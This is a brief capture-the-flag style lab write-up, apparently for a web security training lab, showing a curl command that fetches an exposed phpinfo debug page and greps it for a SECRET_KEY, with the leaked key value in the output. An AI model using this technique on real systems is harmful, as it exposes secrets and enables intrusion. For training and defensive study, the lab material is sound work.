# Lab: Information disclosure on debug page

```bash
┌──(kali㉿kali)-[~]
└─$ curl https://ac5d1f6e1f9e5469c0feaf6e00640073.web-security-academy.net/cgi-bin/phpinfo.php | grep -i secret_key
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<tr><td class="e">SECRET_KEY </td><td class="v">faxl7173iib4rp0r5oooorx0on04uunl </td></tr>
 80 67737   80 54588    0     0  47440      0  0:00:01  0:00:01 --:--:-- 47426<tr><td class="e">$_SERVER['SECRET_KEY']</td><td class="v">faxl7173iib4rp0r5oooorx0on04uunl</td></tr>
100 67737  100 67737    0     0  58854      0  0:00:01  0:00:01 --:--:-- 58850
```

